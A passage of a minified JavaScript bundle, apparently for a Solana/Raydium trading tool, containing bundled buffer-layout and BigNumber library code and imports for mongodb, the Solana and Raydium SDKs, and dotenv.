var wn=Object.create;var Lt=Object.defineProperty;var bn=Object.getOwnPropertyDescriptor;var En=Object.getOwnPropertyNames;var Sn=Object.getPrototypeOf,An=Object.prototype.hasOwnProperty;var On=(r=>typeof require<"u"?require:typeof Proxy<"u"?new Proxy(r,{get:(e,t)=>(typeof require<"u"?require:e)[t]}):r)(function(r){if(typeof require<"u")return require.apply(this,arguments);throw Error('Dynamic require of "'+r+'" is not supported')});var In=(r,e)=>()=>(e||r((e={exports:{}}).exports,e),e.exports);var kn=(r,e,t,o)=>{if(e&&typeof e=="object"||typeof e=="function")for(let s of En(e))!An.call(r,s)&&s!==t&&Lt(r,s,{get:()=>e[s],enumerable:!(o=bn(e,s))||o.enumerable});return r};var Be=(r,e,t)=>(t=r!=null?wn(Sn(r)):{},kn(e||!r||!r.__esModule?Lt(t,"default",{value:r,enumerable:!0}):t,r));var Pe=In(h=>{"use strict";Object.defineProperty(h,"__esModule",{value:!0});h.s16=h.s8=h.nu64be=h.u48be=h.u40be=h.u32be=h.u24be=h.u16be=h.nu64=h.u48=h.u40=h.u32=h.u24=h.u16=h.u8=h.offset=h.greedy=h.Constant=h.UTF8=h.CString=h.Blob=h.Boolean=h.BitField=h.BitStructure=h.VariantLayout=h.Union=h.UnionLayoutDiscriminator=h.UnionDiscriminator=h.Structure=h.Sequence=h.DoubleBE=h.Double=h.FloatBE=h.Float=h.NearInt64BE=h.NearInt64=h.NearUInt64BE=h.NearUInt64=h.IntBE=h.Int=h.UIntBE=h.UInt=h.OffsetLayout=h.GreedyCount=h.ExternalLayout=h.bindConstructorLayout=h.nameWithProperty=h.Layout=h.uint8ArrayToBuffer=h.checkUint8Array=void 0;h.constant=h.utf8=h.cstr=h.blob=h.unionLayoutDiscriminator=h.union=h.seq=h.bits=h.struct=h.f64be=h.f64=h.f32be=h.f32=h.ns64be=h.s48be=h.s40be=h.s32be=h.s24be=h.s16be=h.ns64=h.s48=h.s40=h.s32=h.s24=void 0;var mt=On("buffer");function we(r){if(!(r instanceof Uint8Array))throw new TypeError("b must be a Uint8Array")}h.checkUint8Array=we;function L(r){return we(r),mt.Buffer.from(r.buffer,r.byteOffset,r.length)}h.uint8ArrayToBuffer=L;var M=class{constructor(e,t){if(!Number.isInteger(e))throw new TypeError("span must be an integer");this.span=e,this.property=t}makeDestinationObject(){return{}}getSpan(e,t){if(0>this.span)throw new RangeError("indeterminate span");return this.span}replicate(e){let t=Object.create(this.constructor.prototype);return Object.assign(t,this),t.property=e,t}fromArray(e){}};h.Layout=M;function yt(r,e){return e.property?r+"["+e.property+"]":r}h.nameWithProperty=yt;function xn(r,e){if(typeof r!="function")throw new TypeError("Class must be constructor");if(Object.prototype.hasOwnProperty.call(r,"layout_"))throw new Error("Class is already bound to a layout");if(!(e&&e instanceof M))throw new TypeError("layout must be a Layout");if(Object.prototype.hasOwnProperty.call(e,"boundConstructor_"))throw new Error("layout is already bound to a constructor");r.layout_=e,e.boundConstructor_=r,e.makeDestinationObject=()=>new r,Object.defineProperty(r.prototype,"encode",{value(t,o){return e.encode(this,t,o)},writable:!0}),Object.defineProperty(r,"decode",{value(t,o){return e.decode(t,o)},writable:!0})}h.bindConstructorLayout=xn;var q=class extends M{isCount(){throw new Error("ExternalLayout is abstract")}};h.ExternalLayout=q;var ve=class extends q{constructor(e=1,t){if(!Number.isInteger(e)||0>=e)throw new TypeError("elementSpan must be a (positive) integer");super(-1,t),this.elementSpan=e}isCount(){return!0}decode(e,t=0){we(e);let o=e.length-t;return Math.floor(o/this.elementSpan)}encode(e,t,o){return 0}};h.GreedyCount=ve;var Oe=class extends q{constructor(e,t=0,o){if(!(e instanceof M))throw new TypeError("layout must be a Layout");if(!Number.isInteger(t))throw new TypeError("offset must be integer or undefined");super(e.span,o||e.property),this.layout=e,this.offset=t}isCount(){return this.layout instanceof Y||this.layout instanceof Q}decode(e,t=0){return this.layout.decode(e,t+this.offset)}encode(e,t,o=0){return this.layout.encode(e,t,o+this.offset)}};h.OffsetLayout=Oe;var Y=class extends M{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return L(e).readUIntLE(t,this.span)}encode(e,t,o=0){return L(t).writeUIntLE(e,o,this.span),this.span}};h.UInt=Y;var Q=class extends M{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return L(e).readUIntBE(t,this.span)}encode(e,t,o=0){return L(t).writeUIntBE(e,o,this.span),this.span}};h.UIntBE=Q;var ae=class extends M{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return L(e).readIntLE(t,this.span)}encode(e,t,o=0){return L(t).writeIntLE(e,o,this.span),this.span}};h.Int=ae;var le=class extends M{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return L(e).readIntBE(t,this.span)}encode(e,t,o=0){return L(t).writeIntBE(e,o,this.span),this.span}};h.IntBE=le;var ht=Math.pow(2,32);function Xe(r){let e=Math.floor(r/ht),t=r-e*ht;return{hi32:e,lo32:t}}function Ze(r,e){return r*ht+e}var Re=class extends M{constructor(e){super(8,e)}decode(e,t=0){let o=L(e),s=o.readUInt32LE(t),l=o.readUInt32LE(t+4);return Ze(l,s)}encode(e,t,o=0){let s=Xe(e),l=L(t);return l.writeUInt32LE(s.lo32,o),l.writeUInt32LE(s.hi32,o+4),8}};h.NearUInt64=Re;var Ue=class extends M{constructor(e){super(8,e)}decode(e,t=0){let o=L(e),s=o.readUInt32BE(t),l=o.readUInt32BE(t+4);return Ze(s,l)}encode(e,t,o=0){let s=Xe(e),l=L(t);return l.writeUInt32BE(s.hi32,o),l.writeUInt32BE(s.lo32,o+4),8}};h.NearUInt64BE=Ue;var Ve=class extends M{constructor(e){super(8,e)}decode(e,t=0){let o=L(e),s=o.readUInt32LE(t),l=o.readInt32LE(t+4);return Ze(l,s)}encode(e,t,o=0){let s=Xe(e),l=L(t);return l.writeUInt32LE(s.lo32,o),l.writeInt32LE(s.hi32,o+4),8}};h.NearInt64=Ve;var Ke=class extends M{constructor(e){super(8,e)}decode(e,t=0){let o=L(e),s=o.readInt32BE(t),l=o.readUInt32BE(t+4);return Ze(s,l)}encode(e,t,o=0){let s=Xe(e),l=L(t);return l.writeInt32BE(s.hi32,o),l.writeUInt32BE(s.lo32,o+4),8}};h.NearInt64BE=Ke;var Ce=class extends M{constructor(e){super(4,e)}decode(e,t=0){return L(e).readFloatLE(t)}encode(e,t,o=0){return L(t).writeFloatLE(e,o),4}};h.Float=Ce;var De=class extends M{constructor(e){super(4,e)}decode(e,t=0){return L(e).readFloatBE(t)}encode(e,t,o=0){return L(t).writeFloatBE(e,o),4}};h.FloatBE=De;var $e=class extends M{constructor(e){super(8,e)}decode(e,t=0){return L(e).readDoubleLE(t)}encode(e,t,o=0){return L(t).writeDoubleLE(e,o),8}};h.Double=$e;var Fe=class extends M{constructor(e){super(8,e)}decode(e,t=0){return L(e).readDoubleBE(t)}encode(e,t,o=0){return L(t).writeDoubleBE(e,o),8}};h.DoubleBE=Fe;var qe=class extends M{constructor(e,t,o){if(!(e instanceof M))throw new TypeError("elementLayout must be a Layout");if(!(t instanceof q&&t.isCount()||Number.isInteger(t)&&0<=t))throw new TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");let s=-1;!(t instanceof q)&&0<e.span&&(s=t*e.span),super(s,o),this.elementLayout=e,this.count=t}getSpan(e,t=0){if(0<=this.span)return this.span;let o=0,s=this.count;if(s instanceof q&&(s=s.decode(e,t)),0<this.elementLayout.span)o=s*this.elementLayout.span;else{let l=0;for(;l<s;)o+=this.elementLayout.getSpan(e,t+o),++l}return o}decode(e,t=0){let o=[],s=0,l=this.count;for(l instanceof q&&(l=l.decode(e,t));s<l;)o.push(this.elementLayout.decode(e,t)),t+=this.elementLayout.getSpan(e,t),s+=1;return o}encode(e,t,o=0){let s=this.elementLayout,l=e.reduce((b,S)=>b+s.encode(S,t,o+b),0);return this.count instanceof q&&this.count.encode(e.length,t,o),l}};h.Sequence=qe;var Ge=class extends M{constructor(e,t,o){if(!(Array.isArray(e)&&e.reduce((l,b)=>l&&b instanceof M,!0)))throw new TypeError("fields must be array of Layout instances");typeof t=="boolean"&&o===void 0&&(o=t,t=void 0);for(let l of e)if(0>l.span&&l.property===void 0)throw new Error("fields cannot contain unnamed variable-length layout");let s=-1;try{s=e.reduce((l,b)=>l+b.getSpan(),0)}catch{}super(s,t),this.fields=e,this.decodePrefixes=!!o}getSpan(e,t=0){if(0<=this.span)return this.span;let o=0;try{o=this.fields.reduce((s,l)=>{let b=l.getSpan(e,t);return t+=b,s+b},0)}catch{throw new RangeError("indeterminate span")}return o}decode(e,t=0){we(e);let o=this.makeDestinationObject();for(let s of this.fields)if(s.property!==void 0&&(o[s.property]=s.decode(e,t)),t+=s.getSpan(e,t),this.decodePrefixes&&e.length===t)break;return o}encode(e,t,o=0){let s=o,l=0,b=0;for(let S of this.fields){let k=S.span;if(b=0<k?k:0,S.property!==void 0){let N=e[S.property];N!==void 0&&(b=S.encode(N,t,o),0>k&&(k=S.getSpan(t,o)))}l=o,o+=k}return l+b-s}fromArray(e){let t=this.makeDestinationObject();for(let o of this.fields)o.property!==void 0&&0<e.length&&(t[o.property]=e.shift());return t}layoutFor(e){if(typeof e!="string")throw new TypeError("property must be string");for(let t of this.fields)if(t.property===e)return t}offsetOf(e){if(typeof e!="string")throw new TypeError("property must be string");let t=0;for(let o of this.fields){if(o.property===e)return t;0>o.span?t=-1:0<=t&&(t+=o.span)}}};h.Structure=Ge;var Ie=class{constructor(e){this.property=e}decode(e,t){throw new Error("UnionDiscriminator is abstract")}encode(e,t,o){throw new Error("UnionDiscriminator is abstract")}};h.UnionDiscriminator=Ie;var ge=class extends Ie{constructor(e,t){if(!(e instanceof q&&e.isCount()))throw new TypeError("layout must be an unsigned integer ExternalLayout");super(t||e.property||"variant"),this.layout=e}decode(e,t){return this.layout.decode(e,t)}encode(e,t,o){return this.layout.encode(e,t,o)}};h.UnionLayoutDiscriminator=ge;var ke=class extends M{constructor(e,t,o){let s;if(e instanceof Y||e instanceof Q)s=new ge(new Oe(e));else if(e instanceof q&&e.isCount())s=new ge(e);else if(e instanceof Ie)s=e;else throw new TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");if(t===void 0&&(t=null),!(t===null||t instanceof M))throw new TypeError("defaultLayout must be null or a Layout");if(t!==null){if(0>t.span)throw new Error("defaultLayout must have constant span");t.property===void 0&&(t=t.replicate("content"))}let l=-1;t&&(l=t.span,0<=l&&(e instanceof Y||e instanceof Q)&&(l+=s.layout.span)),super(l,o),this.discriminator=s,this.usesPrefixDiscriminator=e instanceof Y||e instanceof Q,this.defaultLayout=t,this.registry={};let b=this.defaultGetSourceVariant.bind(this);this.getSourceVariant=function(S){return b(S)},this.configGetSourceVariant=function(S){b=S.bind(this)}}getSpan(e,t=0){if(0<=this.span)return this.span;let o=this.getVariant(e,t);if(!o)throw new Error("unable to determine span for unrecognized variant");return o.getSpan(e,t)}defaultGetSourceVariant(e){if(Object.prototype.hasOwnProperty.call(e,this.discriminator.property)){if(this.defaultLayout&&this.defaultLayout.property&&Object.prototype.hasOwnProperty.call(e,this.defaultLayout.property))return;let t=this.registry[e[this.discriminator.property]];if(t&&(!t.layout||t.property&&Object.prototype.hasOwnProperty.call(e,t.property)))return t}else for(let t in this.registry){let o=this.registry[t];if(o.property&&Object.prototype.hasOwnProperty.call(e,o.property))return o}throw new Error("unable to infer src variant")}decode(e,t=0){let o,s=this.discriminator,l=s.decode(e,t),b=this.registry[l];if(b===void 0){let S=this.defaultLayout,k=0;this.usesPrefixDiscriminator&&(k=s.layout.span),o=this.makeDestinationObject(),o[s.property]=l,o[S.property]=S.decode(e,t+k)}else o=b.decode(e,t);return o}encode(e,t,o=0){let s=this.getSourceVariant(e);if(s===void 0){let l=this.discriminator,b=this.defaultLayout,S=0;return this.usesPrefixDiscriminator&&(S=l.layout.span),l.encode(e[l.property],t,o),S+b.encode(e[b.property],t,o+S)}return s.encode(e,t,o)}addVariant(e,t,o){let s=new ze(this,e,t,o);return this.registry[e]=s,s}getVariant(e,t=0){let o;return e instanceof Uint8Array?o=this.discriminator.decode(e,t):o=e,this.registry[o]}};h.Union=ke;var ze=class extends M{constructor(e,t,o,s){if(!(e instanceof ke))throw new TypeError("union must be a Union");if(!Number.isInteger(t)||0>t)throw new TypeError("variant must be a (non-negative) integer");if(typeof o=="string"&&s===void 0&&(s=o,o=null),o){if(!(o instanceof M))throw new TypeError("layout must be a Layout");if(e.defaultLayout!==null&&0<=o.span&&o.span>e.defaultLayout.span)throw new Error("variant span exceeds span of containing union");if(typeof s!="string")throw new TypeError("variant must have a String property")}let l=e.span;0>e.span&&(l=o?o.span:0,0<=l&&e.usesPrefixDiscriminator&&(l+=e.discriminator.layout.span)),super(l,s),this.union=e,this.variant=t,this.layout=o||null}getSpan(e,t=0){if(0<=this.span)return this.span;let o=0;this.union.usesPrefixDiscriminator&&(o=this.union.discriminator.layout.span);let s=0;return this.layout&&(s=this.layout.getSpan(e,t+o)),o+s}decode(e,t=0){let o=this.makeDestinationObject();if(this!==this.union.getVariant(e,t))throw new Error("variant mismatch");let s=0;return this.union.usesPrefixDiscriminator&&(s=this.union.discriminator.layout.span),this.layout?o[this.property]=this.layout.decode(e,t+s):this.property?o[this.property]=!0:this.union.usesPrefixDiscriminator&&(o[this.union.discriminator.property]=this.variant),o}encode(e,t,o=0){let s=0;if(this.union.usesPrefixDiscriminator&&(s=this.union.discriminator.layout.span),this.layout&&!Object.prototype.hasOwnProperty.call(e,this.property))throw new TypeError("variant lacks property "+this.property);this.union.discriminator.encode(this.variant,t,o);let l=s;if(this.layout&&(this.layout.encode(e[this.property],t,o+s),l+=this.layout.getSpan(t,o+s),0<=this.union.span&&l>this.union.span))throw new Error("encoded variant overruns containing union");return l}fromArray(e){if(this.layout)return this.layout.fromArray(e)}};h.VariantLayout=ze;function ye(r){return 0>r&&(r+=4294967296),r}var xe=class extends M{constructor(e,t,o){if(!(e instanceof Y||e instanceof Q))throw new TypeError("word must be a UInt or UIntBE layout");if(typeof t=="string"&&o===void 0&&(o=t,t=!1),4<e.span)throw new RangeError("word cannot exceed 32 bits");super(e.span,o),this.word=e,this.msb=!!t,this.fields=[];let s=0;this._packedSetValue=function(l){return s=ye(l),this},this._packedGetValue=function(){return s}}decode(e,t=0){let o=this.makeDestinationObject(),s=this.word.decode(e,t);this._packedSetValue(s);for(let l of this.fields)l.property!==void 0&&(o[l.property]=l.decode(e));return o}encode(e,t,o=0){let s=this.word.decode(t,o);this._packedSetValue(s);for(let l of this.fields)if(l.property!==void 0){let b=e[l.property];b!==void 0&&l.encode(b)}return this.word.encode(this._packedGetValue(),t,o)}addField(e,t){let o=new Te(this,e,t);return this.fields.push(o),o}addBoolean(e){let t=new Ye(this,e);return this.fields.push(t),t}fieldFor(e){if(typeof e!="string")throw new TypeError("property must be string");for(let t of this.fields)if(t.property===e)return t}};h.BitStructure=xe;var Te=class{constructor(e,t,o){if(!(e instanceof xe))throw new TypeError("container must be a BitStructure");if(!Number.isInteger(t)||0>=t)throw new TypeError("bits must be positive integer");let s=8*e.span,l=e.fields.reduce((b,S)=>b+S.bits,0);if(t+l>s)throw new Error("bits too long for span remainder ("+(s-l)+" of "+s+" remain)");this.container=e,this.bits=t,this.valueMask=(1<<t)-1,t===32&&(this.valueMask=4294967295),this.start=l,this.container.msb&&(this.start=s-l-t),this.wordMask=ye(this.valueMask<<this.start),this.property=o}decode(e,t){let o=this.container._packedGetValue();return ye(o&this.wordMask)>>>this.start}encode(e){if(typeof e!="number"||!Number.isInteger(e)||e!==ye(e&this.valueMask))throw new TypeError(yt("BitField.encode",this)+" value must be integer not exceeding "+this.valueMask);let t=this.container._packedGetValue(),o=ye(e<<this.start);this.container._packedSetValue(ye(t&~this.wordMask)|o)}};h.BitField=Te;var Ye=class extends Te{constructor(e,t){super(e,1,t)}decode(e,t){return!!super.decode(e,t)}encode(e){typeof e=="boolean"&&(e=+e),super.encode(e)}};h.Boolean=Ye;var je=class extends M{constructor(e,t){if(!(e instanceof q&&e.isCount()||Number.isInteger(e)&&0<=e))throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");let o=-1;e instanceof q||(o=e),super(o,t),this.length=e}getSpan(e,t){let o=this.span;return 0>o&&(o=this.length.decode(e,t)),o}decode(e,t=0){let o=this.span;return 0>o&&(o=this.length.decode(e,t)),L(e).slice(t,t+o)}encode(e,t,o){let s=this.length;if(this.length instanceof q&&(s=e.length),!(e instanceof Uint8Array&&s===e.length))throw new TypeError(yt("Blob.encode",this)+" requires (length "+s+") Uint8Array as src");if(o+s>t.length)throw new RangeError("encoding overruns Uint8Array");let l=L(e);return L(t).write(l.toString("hex"),o,s,"hex"),this.length instanceof q&&this.length.encode(s,t,o),s}};h.Blob=je;var We=class extends M{constructor(e){super(-1,e)}getSpan(e,t=0){we(e);let o=t;for(;o<e.length&&e[o]!==0;)o+=1;return 1+o-t}decode(e,t=0){let o=this.getSpan(e,t);return L(e).slice(t,t+o-1).toString("utf-8")}encode(e,t,o=0){typeof e!="string"&&(e=String(e));let s=mt.Buffer.from(e,"utf8"),l=s.length;if(o+l>t.length)throw new RangeError("encoding overruns Buffer");let b=L(t);return s.copy(b,o),b[o+l]=0,l+1}};h.CString=We;var He=class extends M{constructor(e,t){if(typeof e=="string"&&t===void 0&&(t=e,e=void 0),e===void 0)e=-1;else if(!Number.isInteger(e))throw new TypeError("maxSpan must be an integer");super(-1,t),this.maxSpan=e}getSpan(e,t=0){return we(e),e.length-t}decode(e,t=0){let o=this.getSpan(e,t);if(0<=this.maxSpan&&this.maxSpan<o)throw new RangeError("text length exceeds maxSpan");return L(e).slice(t,t+o).toString("utf-8")}encode(e,t,o=0){typeof e!="string"&&(e=String(e));let s=mt.Buffer.from(e,"utf8"),l=s.length;if(0<=this.maxSpan&&this.maxSpan<l)throw new RangeError("text length exceeds maxSpan");if(o+l>t.length)throw new RangeError("encoding overruns Buffer");return s.copy(L(t),o),l}};h.UTF8=He;var Qe=class extends M{constructor(e,t){super(0,t),this.value=e}decode(e,t){return this.value}encode(e,t,o){return 0}};h.Constant=Qe;h.greedy=(r,e)=>new ve(r,e);h.offset=(r,e,t)=>new Oe(r,e,t);h.u8=r=>new Y(1,r);h.u16=r=>new Y(2,r);h.u24=r=>new Y(3,r);h.u32=r=>new Y(4,r);h.u40=r=>new Y(5,r);h.u48=r=>new Y(6,r);h.nu64=r=>new Re(r);h.u16be=r=>new Q(2,r);h.u24be=r=>new Q(3,r);h.u32be=r=>new Q(4,r);h.u40be=r=>new Q(5,r);h.u48be=r=>new Q(6,r);h.nu64be=r=>new Ue(r);h.s8=r=>new ae(1,r);h.s16=r=>new ae(2,r);h.s24=r=>new ae(3,r);h.s32=r=>new ae(4,r);h.s40=r=>new ae(5,r);h.s48=r=>new ae(6,r);h.ns64=r=>new Ve(r);h.s16be=r=>new le(2,r);h.s24be=r=>new le(3,r);h.s32be=r=>new le(4,r);h.s40be=r=>new le(5,r);h.s48be=r=>new le(6,r);h.ns64be=r=>new Ke(r);h.f32=r=>new Ce(r);h.f32be=r=>new De(r);h.f64=r=>new $e(r);h.f64be=r=>new Fe(r);h.struct=(r,e,t)=>new Ge(r,e,t);h.bits=(r,e,t)=>new xe(r,e,t);h.seq=(r,e,t)=>new qe(r,e,t);h.union=(r,e,t)=>new ke(r,e,t);h.unionLayoutDiscriminator=(r,e)=>new ge(r,e);h.blob=(r,e)=>new je(r,e);h.cstr=r=>new We(r);h.utf8=(r,e)=>new He(r,e);h.constant=(r,e)=>new Qe(r,e)});import{MongoClient as nr}from"mongodb";import{Liquidity as nn,LIQUIDITY_STATE_LAYOUT_V4 as Le,MARKET_STATE_LAYOUT_V3 as Tt,Token as xt,TokenAmount as be}from"@raydium-io/raydium-sdk";import{AccountLayout as rr,createAssociatedTokenAccountIdempotentInstruction as or,createCloseAccountInstruction as ir,getAssociatedTokenAddressSync as sr,TOKEN_PROGRAM_ID as rn}from"@solana/spl-token";import{Keypair as ar,Connection as cr,PublicKey as ur,ComputeBudgetProgram as it,TransactionMessage as on,VersionedTransaction as sn}from"@solana/web3.js";import{Keypair as Un,Connection as Vn,clusterApiUrl as Kn,SystemProgram as Cn,PublicKey as Gt,Transaction as Dn}from"@solana/web3.js";import{MARKET_STATE_LAYOUT_V3 as $n}from"@raydium-io/raydium-sdk";import{Liquidity as Fn,Market as qn,SPL_ACCOUNT_LAYOUT as Gn,publicKey as Ot,struct as zn,MAINNET_PROGRAM_ID as zt,DEVNET_PROGRAM_ID as Yn}from"@raydium-io/raydium-sdk";import{TOKEN_PROGRAM_ID as jn}from"@solana/spl-token";import Wn from"dotenv";var me=Be(Pe());var fe=r=>{let e=r.decode.bind(r),t=r.encode.bind(r);return{decode:e,encode:t}};var gt=Be(Pe(),1);import{toBigIntBE as Tn,toBigIntLE as Pn,toBufferBE as Ln,toBufferLE as Mn}from"bigint-buffer";var Je=r=>e=>{let t=(0,gt.blob)(r,e),{encode:o,decode:s}=fe(t),l=t;return l.decode=(b,S)=>{let k=s(b,S);return Pn(Buffer.from(k))},l.encode=(b,S,k)=>{let N=Mn(b,r);return o(N,S,k)},l},et=r=>e=>{let t=(0,gt.blob)(r,e),{encode:o,decode:s}=fe(t),l=t;return l.decode=(b,S)=>{let k=s(b,S);return Tn(Buffer.from(k))},l.encode=(b,S,k)=>{let N=Ln(b,r);return o(N,S,k)},l},Mt=Je(8),_r=et(8),_n=Je(16),Nr=et(16),Br=Je(24),vr=et(24),Rr=Je(32),Ur=et(32);var Nn=/^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,wt=Math.ceil,ee=Math.floor,j="[BigNumber Error] ",_t=j+"Number primitive has more than 15 significant digits: ",re=1e14,x=14,bt=9007199254740991,Et=[1,10,100,1e3,1e4,1e5,1e6,1e7,1e8,1e9,1e10,1e11,1e12,1e13],de=1e7,C=1e9;function Nt(r){var e,t,o,s=E.prototype={constructor:E,toString:null,valueOf:null},l=new E(1),b=20,S=4,k=-7,N=21,z=-1e7,U=1e7,H=!1,ue=1,oe=0,ct={prefix:"",groupSize:3,secondaryGroupSize:0,groupSeparator:",",decimalSeparator:".",fractionGroupSize:0,fractionGroupSeparator:"\xA0",suffix:""},pe="0123456789abcdefghijklmnopqrstuvwxyz",ut=!0;function E(n,i){var a,m,u,d,g,c,f,y,p=this;if(!(p instanceof E))return new E(n,i);if(i==null){if(n&&n._isBigNumber===!0){p.s=n.s,!n.c||n.e>U?p.c=p.e=null:n.e<z?p.c=[p.e=0]:(p.e=n.e,p.c=n.c.slice());return}if((c=typeof n=="number")&&n*0==0){if(p.s=1/n<0?(n=-n,-1):1,n===~~n){for(d=0,g=n;g>=10;g/=10,d++);d>U?p.c=p.e=null:(p.e=d,p.c=[n]);return}y=String(n)}else{if(!Nn.test(y=String(n)))return o(p,y,c);p.s=y.charCodeAt(0)==45?(y=y.slice(1),-1):1}(d=y.indexOf("."))>-1&&(y=y.replace(".","")),(g=y.search(/e/i))>0?(d<0&&(d=g),d+=+y.slice(g+1),y=y.substring(0,g)):d<0&&(d=y.length)}else{if(B(i,2,pe.length,"Base"),i==10&&ut)return p=new E(n),X(p,b+p.e+1,S);if(y=String(n),c=typeof n=="number"){if(n*0!=0)return o(p,y,c,i);if(p.s=1/n<0?(y=y.slice(1),-1):1,E.DEBUG&&y.replace(/^0\.0*|\./,"").length>15)throw Error(_t+n)}else p.s=y.charCodeAt(0)===45?(y=y.slice(1),-1):1;for(a=pe.slice(0,i),d=g=0,f=y.length;g<f;g++)if(a.indexOf(m=y.charAt(g))<0){if(m=="."){if(g>d){d=f;continue}}else if(!u&&(y==y.toUpperCase()&&(y=y.toLowerCase())||y==y.toLowerCase()&&(y=y.toUpperCase()))){u=!0,g=-1,d=0;continue}return o(p,String(n),c,i)}c=!1,y=t(y,i,10,p.s),(d=y.indexOf("."))>-1?y=y.replace(".",""):d=y.length}for(g=0;y.charCodeAt(g)===48;g++);for(f=y.length;y.charCodeAt(--f)===48;);if(y=y.slice(g,++f)){if(f-=g,c&&E.DEBUG&&f>15&&(n>bt||n!==ee(n)))throw Error(_t+p.s*n);if((d=d-g-1)>U)p.c=p.e=null;else if(d<z)p.c=[p.e=0];else{if(p.e=d,p.c=[],g=(d+1)%x,d<0&&(g+=x),g<f){for(g&&p.c.push(+y.slice(0,g)),f-=x;g<f;)p.c.push(+y.slice(g,g+=x));g=x-(y=y.slice(g)).length}else g-=f;for(;g--;y+="0");p.c.push(+y)}}else p.c=[p.e=0]}E.clone=Nt,E.ROUND_UP=0,E.ROUND_DOWN=1,E.ROUND_CEIL=2,E.ROUND_FLOOR=3,E.ROUND_HALF_UP=4,E.ROUND_HALF_DOWN=5,E.ROUND_HALF_EVEN=6,E.ROUND_HALF_CEIL=7,E.ROUND_HALF_FLOOR=8,E.EUCLID=9,E.config=E.set=function(n){var i,a;if(n!=null)if(typeof n=="object"){if(n.hasOwnProperty(i="DECIMAL_PLACES")&&(a=n[i],B(a,0,C,i),b=a),n.hasOwnProperty(i="ROUNDING_MODE")&&(a=n[i],B(a,0,8,i),S=a),n.hasOwnProperty(i="EXPONENTIAL_AT")&&(a=n[i],a&&a.pop?(B(a[0],-C,0,i),B(a[1],0,C,i),k=a[0],N=a[1]):(B(a,-C,C,i),k=-(N=a<0?-a:a))),n.hasOwnProperty(i="RANGE"))if(a=n[i],a&&a.pop)B(a[0],-C,-1,i),B(a[1],1,C,i),z=a[0],U=a[1];else if(B(a,-C,C,i),a)z=-(U=a<0?-a:a);else throw Error(j+i+" cannot be zero: "+a);if(n.hasOwnProperty(i="CRYPTO"))if(a=n[i],a===!!a)if(a)if(typeof crypto<"u"&&crypto&&(crypto.getRandomValues||crypto.randomBytes))H=a;else throw H=!a,Error(j+"crypto unavailable");else H=a;else throw Error(j+i+" not true or false: "+a);if(n.hasOwnProperty(i="MODULO_MODE")&&(a=n[i],B(a,0,9,i),ue=a),n.hasOwnProperty(i="POW_PRECISION")&&(a=n[i],B(a,0,C,i),oe=a),n.hasOwnProperty(i="FORMAT"))if(a=n[i],typeof a=="object")ct=a;else throw Error(j+i+" not an object: "+a);if(n.hasOwnProperty(i="ALPHABET"))if(a=n[i],typeof a=="string"&&!/^.?$|[+\-.\s]|(.).*\1/.test(a))ut=a.slice(0,10)=="0123456789",pe=a;else throw Error(j+i+" invalid: "+a)}else throw Error(j+"Object expected: "+n);return{DECIMAL_PLACES:b,ROUNDING_MODE:S,EXPONENTIAL_AT:[k,N],RANGE:[z,U],CRYPTO:H,MODULO_MODE:ue,POW_PRECISION:oe,FORMAT:ct,ALPHABET:pe}},E.isBigNumber=function(n){if(!n||n._isBigNumber!==!0)return!1;if(!E.DEBUG)return!0;var i,a,m=n.c,u=n.e,d=n.s;e:if({}.toString.call(m)=="[object Array]"){if((d===1||d===-1)&&u>=-C&&u<=C&&u===ee(u)){if(m[0]===0){if(u===0&&m.length===1)return!0;break e}if(i=(u+1)%x,i<1&&(i+=x),String(m[0]).length==i){for(i=0;i<m.length;i++)if(a=m[i],a<0||a>=re||a!==ee(a))break e;if(a!==0)return!0}}}else if(m===null&&u===null&&(d===null||d===1||d===-1))return!0;throw Error(j+"Invalid BigNumber: "+n)},E.maximum=E.max=function(){return Pt(arguments,-1)},E.minimum=E.min=function(){return Pt(arguments,1)},E.random=function(){var n=9007199254740992,i=Math.random()*n&2097151?function(){return ee(Math.random()*n)}:function(){return(Math.random()*1073741824|0)*8388608+(Math.random()*8388608|0)};return function(a){var m,u,d,g,c,f=0,y=[],p=new E(l);if(a==null?a=b:B(a,0,C),g=wt(a/x),H)if(crypto.getRandomValues){for(m=crypto.getRandomValues(new Uint32Array(g*=2));f<g;)c=m[f]*131072+(m[f+1]>>>11),c>=9e15?(u=crypto.getRandomValues(new Uint32Array(2)),m[f]=u[0],m[f+1]=u[1]):(y.push(c%1e14),f+=2);f=g/2}else if(crypto.randomBytes){for(m=crypto.randomBytes(g*=7);f<g;)c=(m[f]&31)*281474976710656+m[f+1]*1099511627776+m[f+2]*4294967296+m[f+3]*16777216+(m[f+4]<<16)+(m[f+5]<<8)+m[f+6],c>=9e15?crypto.randomBytes(7).copy(m,f):(y.push(c%1e14),f+=7);f=g/7}else throw H=!1,Error(j+"crypto unavailable");if(!H)for(;f<g;)c=i(),c<9e15&&(y[f++]=c%1e14);for(g=y[--f],a%=x,g&&a&&(c=Et[x-a],y[f]=ee(g/c)*c);y[f]===0;y.pop(),f--);if(f<0)y=[d=0];else{for(d=-1;y[0]===0;y.splice(0,1),d-=x);for(f=1,c=y[0];c>=10;c/=10,f++);f<x&&(d-=x-f)}return p.e=d,p.c=y,p}}(),E.sum=function(){for(var n=1,i=arguments,a=new E(i[0]);n<i.length;)a=a.plus(i[n++]);return a},t=function(){var n="0123456789";function i(a,m,u,d){for(var g,c=[0],f,y=0,p=a.length;y<p;){for(f=c.length;f--;c[f]*=m);for(c[0]+=d.indexOf(a.charAt(y++)),g=0;g<c.length;g++)c[g]>u-1&&(c[g+1]==null&&(c[g+1]=0),c[g+1]+=c[g]/u|0,c[g]%=u)}return c.reverse()}return function(a,m,u,d,g){var c,f,y,p,w,O,I,P,v=a.indexOf("."),V=b,T=S;for(v>=0&&(p=oe,oe=0,a=a.replace(".",""),P=new E(m),O=P.pow(a.length-v),oe=p,P.c=i(ce(J(O.c),O.e,"0"),10,u,n),P.e=P.c.length),I=i(a,m,u,g?(c=pe,n):(c=n,pe)),y=p=I.length;I[--p]==0;I.pop());if(!I[0])return 